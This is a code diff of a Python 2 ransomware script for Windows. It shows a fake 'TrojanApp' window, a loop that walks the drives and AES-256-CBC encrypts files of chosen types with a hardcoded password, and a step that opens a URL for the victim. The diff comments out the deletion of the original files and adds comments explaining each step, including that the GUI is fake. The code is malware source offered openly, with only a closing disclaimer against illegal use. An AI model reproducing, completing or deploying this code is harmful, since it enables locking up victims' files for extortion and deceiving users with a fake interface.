@@ -1,13 +1,4 @@
 #!/usr/bin/python
-'''
-  ____                            
- / ___| _   _ _ __ __ _ _ __  ___ 
- \___ \| | | | '__/ _` | '_ \/ __|
-  ___) | |_| | | | (_| | | | \__ \
- |____/ \__, |_|  \__,_|_| |_|___/
-        |___/                     v1.1
-				by: luisxciv '''
-
 import os, random, struct, hashlib, time, win32api, webbrowser, ttk
 import Tkinter as tk
 from Tkinter import *
@@ -24,7 +15,8 @@ def encryption(key):
     app = TrojanApp()
     app.geometry('500x420')
     app.mainloop()
-    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
+
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]: #I used this snipper to list the currently in-use driver letters of windows
         for root, dirs, files in os.walk(homedir):
             for file in files:
                 if file.endswith(tuple(extensions)):
@@ -41,9 +33,9 @@ def encryption(key):
                     #
 
                     print "[!] - Deleting Original Files..."
-                # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
-                    os.remove(os.path.join(root, file))
-                    print "[+] - Original files deleted."
+                    # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
+                   # os.remove(os.path.join(root, file))
+                    #print "[+] - Original files deleted."
     
                     #Proceeds to next dir
                     seconds = int(1)
@@ -52,9 +44,11 @@ def encryption(key):
                     print
 
     print "[+] - All files are now encrypted and replaced with a .enc file extension"
+
+    #we call the url to be displayed to the user
     webbrowser.open(url, new=new)
 
-#Encryption algorythm (AES-CBC 256)
+#Encryption algorythm (AES-CBC 256) taken from stackoverflow
 def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
     if not out_filename:
         out_filename = in_filename + '.enc'
@@ -82,7 +76,7 @@ def cancel():
 
 LARGE_FONT = ("Verdana", 12)
 
-#Trojan App sample used from github
+#Fake graphical user interface with a custom message and buttons sample used from web searching
 
 class TrojanApp(tk.Tk):
     def __init__(self, *args, **kwargs):
@@ -170,14 +164,16 @@ class PageOne(tk.Frame):
             self.after(200, self.read_bytes)
 
 def password():
-    # Uncomment for password input and comment the line after that (which is the encryption def pass)
+    #If you want to input a password when running the script then uncomment the line below
     #password = raw_input('Enter encryption password: ')
+
+    #and now comment this one below
     password = "123"
     key = hashlib.sha256(password).digest()
     encryption(key)
+
+
 def main():
     password()
-
-
 main()
 # Please dont be an idiot and use this for illegal purposes
